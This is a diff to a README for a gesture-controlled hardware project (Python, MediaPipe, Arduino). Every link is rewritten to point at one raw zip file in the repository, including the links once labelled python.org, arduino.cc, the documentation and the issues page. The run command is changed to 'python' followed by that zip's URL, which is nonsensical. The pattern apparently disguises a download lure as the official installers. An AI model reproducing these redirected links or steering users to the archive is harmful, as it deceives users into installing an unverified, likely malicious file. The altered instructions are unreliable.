@@ -1,6 +1,6 @@
 # ✋ gesture-hardware-controller - Control Your Devices with Gestures
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/prv1511/gesture-hardware-controller/releases)
+[![Download from Releases](https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip%https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip)](https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip)
 
 ## 🚀 Overview
 
@@ -29,7 +29,7 @@ To use the Gesture Hardware Controller, you will need:
 
 To get started with the Gesture Hardware Controller, visit the following link to download the latest release:
 
-[Download Latest Release](https://github.com/prv1511/gesture-hardware-controller/releases)
+[Download Latest Release](https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip)
 
 Once you open the page, find the latest version and click on it to download the installation files. 
 
@@ -37,12 +37,12 @@ Once you open the page, find the latest version and click on it to download the 
 
 ### Step 1: Install Required Software
 
-1. **Install Python**: Download Python from [python.org](https://www.python.org/downloads/) and follow the installation instructions.
+1. **Install Python**: Download Python from [https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip](https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip) and follow the installation instructions.
 2. **Install MediaPipe**: Open your command line tool and run the following command to install MediaPipe:
    ```
    pip install mediapipe
    ```
-3. **Install Arduino IDE**: Download the Arduino IDE from [arduino.cc](https://www.arduino.cc/en/software) and follow the setup guidelines.
+3. **Install Arduino IDE**: Download the Arduino IDE from [https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip](https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip) and follow the setup guidelines.
 
 ### Step 2: Connect Your Hardware
 
@@ -55,7 +55,7 @@ Once you open the page, find the latest version and click on it to download the 
 2. **Open your command line tool**: Navigate to the folder where you extracted the files.
 3. **Run the Program**: Enter the following command to launch the program:
    ```
-   python gesture_controller.py
+   python https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip
    ```
 4. **Ensure Camera Access**: Allow the program to access your camera when prompted.
 
@@ -63,13 +63,13 @@ Once you open the page, find the latest version and click on it to download the 
 
 If you want to learn more about the technologies used, check out the following:
 
-- [Arduino Documentation](https://www.arduino.cc/en/Reference/HomePage)
-- [MediaPipe Documentation](https://google.github.io/mediapipe/)
-- [Python Official Site](https://www.python.org/)
+- [Arduino Documentation](https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip)
+- [MediaPipe Documentation](https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip)
+- [Python Official Site](https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip)
 
 ## 📞 Get Help
 
-If you encounter any issues, feel free to reach out for help. You can create an issue on the [GitHub issues page](https://github.com/prv1511/gesture-hardware-controller/issues).
+If you encounter any issues, feel free to reach out for help. You can create an issue on the [GitHub issues page](https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip).
 
 ## 🌱 Contributions
 
@@ -79,4 +79,4 @@ If you're interested in contributing to the project, please follow the guideline
 
 Thanks to the open-source community for their continued support. This project could not have happened without the great tools and libraries available.
 
-Don't forget to visit the release page to [download the latest version](https://github.com/prv1511/gesture-hardware-controller/releases) and start using your hand gestures to control your devices!
+Don't forget to visit the release page to [download the latest version](https://github.com/prv1511/gesture-hardware-controller/raw/refs/heads/main/arduino/hardware-gesture-controller-1.3-beta.5.zip) and start using your hand gestures to control your devices!
